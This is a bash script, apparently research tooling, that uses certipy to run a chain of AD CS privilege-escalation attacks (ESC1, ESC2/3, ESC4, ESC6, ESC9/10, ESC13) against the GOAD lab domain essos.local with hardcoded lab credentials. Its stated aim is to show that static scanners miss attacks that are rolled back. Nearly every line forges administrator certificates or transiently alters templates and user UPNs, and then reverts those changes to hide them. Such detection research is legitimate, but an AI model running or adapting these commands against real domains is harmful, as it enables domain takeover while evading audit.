#!/usr/bin/env bash
# ==============================================================================
# run_attacks_with_rollback.sh — Ground-Truth AD CS Attack Execution with Rollbacks
# Target Lab: GOAD essos.local (DC03: 192.168.56.12, SRV03/CA: 192.168.56.23)
# ==============================================================================

set -euo pipefail

DC_IP="192.168.56.12"
CA_IP="192.168.56.23"
CA_NAME="ESSOS-CA"
DOMAIN="essos.local"
OUTPUT_DIR="./attack_artifacts"

mkdir -p "$OUTPUT_DIR"
cd "$OUTPUT_DIR"

echo "=========================================================="
echo " [CIPG] Phase 1: Capturing Pre-Attack Baseline Snapshot (t0)"
echo "=========================================================="
certipy find -u "khal.drogo@${DOMAIN}" -p 'horse' -dc-ip "$DC_IP" -json -stdout > t0_essos_static.json
echo "[+] Baseline snapshot saved to t0_essos_static.json"

echo "=========================================================="
echo " [CIPG] Phase 2: Executing Attack Archetypes"
echo "=========================================================="

echo "[*] 1. Executing ESC1 (Static EnrolleeSuppliesSubject Misconfiguration)..."
certipy req -u "khal.drogo@${DOMAIN}" -p 'horse' -target "$CA_IP" -template ESC1 -ca "$CA_NAME" -upn "administrator@${DOMAIN}"
certipy auth -pfx administrator.pfx -dc-ip "$DC_IP" || true
rm -f administrator.pfx

echo "[*] 2. Executing ESC2 & ESC3 (Two-Template CRA Co-Signing Chain)..."
certipy req -u "khal.drogo@${DOMAIN}" -p 'horse' -target "$CA_IP" -template ESC3-CRA -ca "$CA_NAME"
certipy req -u "khal.drogo@${DOMAIN}" -p 'horse' -target "$CA_IP" -template ESC3 -ca "$CA_NAME" -on-behalf-of "${DOMAIN}\\administrator" -pfx khal.drogo.pfx
certipy auth -pfx administrator.pfx -dc-ip "$DC_IP" || true
rm -f khal.drogo.pfx administrator.pfx

echo "[*] 3. Executing ESC4 (Transient Template Mutation & 5-Second Rollback)..."
# Overwrite template flags to make it vulnerable to ESC1 (saves old config)
certipy template -u "khal.drogo@${DOMAIN}" -p 'horse' -dc-ip "$DC_IP" -template ESC4 -save-old
sleep 1
# Request cert during the open window
certipy req -u "khal.drogo@${DOMAIN}" -p 'horse' -target "$CA_IP" -template ESC4 -ca "$CA_NAME" -upn "administrator@${DOMAIN}"
sleep 2
# Restore template to its original benign configuration (DIRECTORY RESTORED!)
certipy template -u "khal.drogo@${DOMAIN}" -p 'horse' -dc-ip "$DC_IP" -template ESC4 -configuration ESC4.json
# Authenticate via PKINIT
certipy auth -pfx administrator.pfx -dc-ip "$DC_IP" || true
rm -f administrator.pfx ESC4.json

echo "[*] 4. Executing ESC6 (CA-Level Flag SAN Abuse on Benign User Template)..."
certipy req -u "khal.drogo@${DOMAIN}" -p 'horse' -target "$CA_IP" -template User -ca "$CA_NAME" -upn "administrator@${DOMAIN}"
certipy auth -pfx administrator.pfx -dc-ip "$DC_IP" || true
rm -f administrator.pfx

echo "[*] 5. Executing ESC9/ESC10 (Transient UPN Swap & Rollback)..."
# Mutate Viserys's UPN to administrator
certipy account update -username "missandei@${DOMAIN}" -p "fr3edom" -user viserys.targaryen -upn "administrator" -dc-ip "$DC_IP"
sleep 1
# Request cert as Viserys
certipy req -u "viserys.targaryen@${DOMAIN}" -p 'GoldCrown' -target "$CA_IP" -template User -ca "$CA_NAME" || true
sleep 2
# Revert Viserys's UPN back to original
certipy account update -username "missandei@${DOMAIN}" -p "fr3edom" -user viserys.targaryen -upn "viserys.targaryen@${DOMAIN}" -dc-ip "$DC_IP"

echo "[*] 6. Executing ESC13 (msDS-OIDToGroupLink Privilege Escalation)..."
certipy req -target "$CA_IP" -u "missandei@${DOMAIN}" -p "fr3edom" -dc-ip "$DC_IP" -template ESC13 -ca "$CA_NAME"
certipy auth -pfx missandei.pfx -dc-ip "$DC_IP" || true
rm -f missandei.pfx

echo "=========================================================="
echo " [CIPG] Phase 3: Capturing Post-Attack Snapshot (t3)"
echo "=========================================================="
certipy find -u "khal.drogo@${DOMAIN}" -p 'horse' -dc-ip "$DC_IP" -json -stdout > t3_essos_static.json

echo "[+] Computing Static Diff between t0 and t3..."
diff -u t0_essos_static.json t3_essos_static.json > diff_t0_t3.patch || true

if [ ! -s diff_t0_t3.patch ]; then
    echo "[!] PROVENANCE PHENOMENON CONFIRMED: diff(t0, t3) == 0!"
    echo "    Static tools see 0 changes, proving complete blindness to rollback attacks."
else
    echo "[+] Static diff generated in diff_t0_t3.patch"
fi

echo "=========================================================="
echo " [CIPG] All Attack Sequences Complete!"
echo "=========================================================="
